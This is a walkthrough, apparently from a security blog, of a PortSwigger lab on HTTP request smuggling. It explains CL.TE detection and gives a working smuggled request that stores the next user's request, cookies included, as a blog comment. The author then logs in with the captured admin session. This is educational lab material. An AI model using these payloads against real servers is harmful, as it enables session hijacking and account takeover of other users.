---
title: " PortSwiggerlabs: Exploiting HTTP request smuggling to capture other users' requests"
date: 2026-07-06 00:00:00 +0000
categories: [PortSwiggerLabs , HTTP Request Smuggling ]
tags: [PortSwiggerLabs , HTTP Request Smuggling , Challenge , Web_Attacks ]
---


## Information : 

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.


## Solution : 

Quick note:

HTTP Request Smuggling happens because of a disagreement between servers. In a typical setup you have a front-end (proxy, load balancer, CDN) forwarding requests to a back-end, and they share persistent TCP connections. The issue is that HTTP gives two ways to tell a server where a request body ends: Content-Length, which just counts bytes, and Transfer-Encoding: chunked, which sends the body in chunks ending with a zero-size chunk. When both headers are present in the same request, different servers may prioritize differently and that gap is what we exploit.

The idea is: you craft a request the front-end considers complete and forwards normally, but the back-end reads it differently and treats part of your body as leftover data sitting in the TCP buffer. That leftover then gets prepended to the next incoming request — yours or another user's. That's how you end up bypassing access controls, hijacking requests, or poisoning responses.

The three main variants are CL.TE, TE.CL, and TE.TE , basically which server trusts which header, or in the TE.TE case, how you obfuscate the Transfer-Encoding header enough that one server just ignores it entirely.

Before jumping into Burp, two things worth knowing: first, disable Update Content-Length in Repeater options , if Burp auto corrects your Content-Length you're defeating the whole point. Second, make sure you're sending over HTTP/1, not HTTP/2. When testing manually, timing delays are your main signal if the response hangs after your crafted request, the back-end is likely waiting for data that isn't coming, which means it's parsing things differently from the front-end. That's your confirmation.

Now back to the lab:

<img width="1652" height="710" alt="image" src="https://github.com/user-attachments/assets/b6df6bbe-2a1f-491a-82e6-e590631280ec" />

Just like everytime we first need to find what case we've got , is it a CL.TE , TE.CL or a TE.TE . 

For this , I like to use this graph from **Jarno Timmermans** : 

<img width="1859" height="934" alt="image" src="https://github.com/user-attachments/assets/9a90be80-cfa7-4f38-921c-dffcba4b90b2" />

But you can use this guide from HackerReciepe : 

```bash
https://www.thehacker.recipes/web/config/http-request-smuggling/#practice
```

Now first let's send the detection request, that based on the response we will know if the backend and front end trust different Headers :

- First Downgrade the request to HTTP1.1/
- Then We change the request Method to POST 
- Then Remove Auto Length
- Add Transfer-Encoding: chunked
- Show Non-printable characters , this will be helpful when it comes to counting Bytes .
- In the Boy , add 

```bash
Content-Lenght: 6
Transfer-Encoding: chunked

1
123
X
```

<img width="755" height="395" alt="image" src="https://github.com/user-attachments/assets/19d9ca15-c9b9-4d0d-a402-171d8f135eea" />

Now if we send this , either we get an error which means the front end is definetly using TE , and since there is no terminating character we immediately get an error , and we need to figure out what the backend is using . 

Or we will get a delay , which means the front end does use CL , but the backend uses TE and since there is no terminating character , it will hang forever until we get a request time out . 

<img width="1402" height="489" alt="image" src="https://github.com/user-attachments/assets/df26b143-f7ff-4b57-a887-605f67654246" />

Perfect we got a request timeout which indicates this is a CL.TE vulnerability . 

Now this lab is a bit different since we are abusing the CL.TE we got to read other user's requests instead of trying to access restricted endpoints like we did in previous labs.

First we'll confirm the CL.TE , using 2 requests as usual , with an attack request , where we add the smuggled request followed by a normal request , which will trigger the request that was stored in the buffer . 

<img width="1439" height="602" alt="image" src="https://github.com/user-attachments/assets/76c44ced-cd29-49bf-8167-ba55d4880dce" />

Now if we send a normal request : 

<img width="1307" height="496" alt="image" src="https://github.com/user-attachments/assets/7cf79fc3-5683-4579-91b1-ecbbe3723fce" />

Perfect this means our request for the 404 was smuggled , and stored inside the buffer . 

Now in this lab , we see that we have the possibility to leave a comment . This is what we will use to be able to read the admin's Request . 

- First we send a normal request for the comment section .
- We modify the content length of our smuggled request so that it exceeds the content length of a normal comment .
- The reason why we're specifying a bigger number is so that the next normal request will be appended to our smuggled request .
- So instead of posting a normal comment , it will be posted with some additional information about the headers from another user.

The practical example should make sense : 

Now first we post a normal comment : 

<img width="1420" height="581" alt="image" src="https://github.com/user-attachments/assets/1b9e2365-c93e-4d38-b6c7-7b7b3f25d6d9" />

We get a redirection :

<img width="1620" height="460" alt="image" src="https://github.com/user-attachments/assets/cc0dcbfe-8662-4d17-a123-1a1623759ca1" />

Now the idea here is that we're trying to smuggle a request that submits our comment . So we need to copy our comment request and use it as a smuggled request : 

```bash
POST /post/comment HTTP/2
Host: 0af0008a03ea46e381a3cf6100700083.web-security-academy.net
Cookie: session=zh4xtXWaNWMg5Jv4xSjWQYXAMFHwfcWi
Content-Length: 121
Content-Type: application/x-www-form-urlencoded

csrf=0Zxq3IkxjNSBI2CgxbLasI6ZuPqlw7TN&postId=7&comment=aaaa&name=aaa&email=aaaa%40gmail.com&website=https%3A%2F%2Faaa.com
```
- Cookie , Content Length and Content Type are the headers that we can't remove .
- We also need the cookie and the CSRF token for it , otherwise the comment won't be posted .

Also we need to change the Body so that the comment is the last parameter , since we need the normal request to be appended to our comment parameter not the website : 

```bash
# Instead of this : 
csrf=0Zxq3IkxjNSBI2CgxbLasI6ZuPqlw7TN&postId=7&comment=aaaa&name=aaa&email=aaaa%40gmail.com&website=https%3A%2F%2Faaa.com

# We put the comment at last :
csrf=0Zxq3IkxjNSBI2CgxbLasI6ZuPqlw7TN&postId=7&name=aaa&email=aaaa%40gmail.com&website=https%3A%2F%2Faaa.com&comment=aaaa

# Now the normal request will be appended to our comment instead so it will look something like this :
csrf=0Zxq3IkxjNSBI2CgxbLasI6ZuPqlw7TN&postId=7&name=aaa&email=aaaa%40gmail.com&website=https%3A%2F%2Faaa.com&comment=aaaaGET / HTTP.2......

```

Now back to our attack request : 

<img width="1892" height="559" alt="image" src="https://github.com/user-attachments/assets/a0cd5dea-6e97-41a4-afc6-aafc7f94635c" />

We see that the content length is 121 , the exact size of our body , but we need the Request of another user to be appended and to show inside of our response , we can do that by increasing the content-Length , but by how much?

Since we need the content of the entire GET Request of the other user , we can simply use burp to see the size of a normal GET request : 

<img width="1920" height="670" alt="image" src="https://github.com/user-attachments/assets/5bb181e5-2de2-4c07-bf24-d7d9db456860" />

We see that it is 793 , and our smuggled request is 121 so in total we need the CL to be 914 . Now our Attack request is done .

Now the last thing we need to fix is the size of our Normal request , since a normal one is only 155 :

<img width="1890" height="467" alt="image" src="https://github.com/user-attachments/assets/7c71ae6a-07d4-41ac-be10-f998c036469e" />

This "Normal" request is just the inital request but without all the unecessary headers , if you want to keep the original one , no problem . 

The problem here is that we've specified the attack request to have a CL of 914 , we will need to increase the size of a normal request , to not have delays as stated by PortSwigger

<img width="953" height="242" alt="image" src="https://github.com/user-attachments/assets/f7b31ca0-08ca-41c1-b7d7-954b414e486c" />

Now we can add new lines to increase the size without causing any issue . 

<img width="1878" height="870" alt="image" src="https://github.com/user-attachments/assets/45283bed-ffb3-4f3f-8d0e-efe0253dd419" />

Now the trick here is that we need to keep sending the attack request and follow it up with a normal one , in hopes someone browses the app in between the 2 requests so that his Headers get appended to our smuggled request and get printed as part of the comment . 

First we send our attack request : 

```bash
POST / HTTP/1.1
Host: 0af0008a03ea46e381a3cf6100700083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 340
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0af0008a03ea46e381a3cf6100700083.web-security-academy.net
Cookie: session=zh4xtXWaNWMg5Jv4xSjWQYXAMFHwfcWi
Content-Length: 914
Content-Type: application/x-www-form-urlencoded

csrf=0Zxq3IkxjNSBI2CgxbLasI6ZuPqlw7TN&postId=7&name=aaa&email=aaaa%40gmail.com&website=https%3A%2F%2Faaa.com&comment=aaaa
```

<img width="1355" height="724" alt="image" src="https://github.com/user-attachments/assets/b3b6bb42-0e89-4b17-b0bd-152665ceae58" />

Then we follow up with the normal request : 

<img width="1301" height="425" alt="image" src="https://github.com/user-attachments/assets/4800d2fa-c0d0-4993-8182-3bfbbc914cd6" />

We get a 302 , this means we posted a normal comment , we will keep retrying it until we get a 200  

<img width="1517" height="777" alt="image" src="https://github.com/user-attachments/assets/7702e9fb-7ccb-4f40-8dff-db8f48722252" />

Perfect we got our 200 , now let's check the comment section : 

<img width="1517" height="776" alt="image" src="https://github.com/user-attachments/assets/9d5ac916-a13a-4db2-bd62-9248e4c6a220" />

Perfect we can see a secret , cookie but not the session cookie , we can increase the CL of our smuggled request : 

<img width="1286" height="606" alt="image" src="https://github.com/user-attachments/assets/d5ec2194-a0d5-406f-b45e-42263652dee9" />

We keep sending the attack request followed by the normal one until we get a 200 which means it was smuggled and the next user's request was appended to it . 

<img width="1102" height="602" alt="image" src="https://github.com/user-attachments/assets/b75e78c8-e14d-4697-a49d-009b4c19c79a" />

We have the session cookie , Perfect !

<img width="1648" height="858" alt="image" src="https://github.com/user-attachments/assets/5054e937-8af0-4b5c-9cef-1a79147eb031" />

We just need to use it to login as the admin via the DevTools . 

That was all for this lab , see you in the next one :)

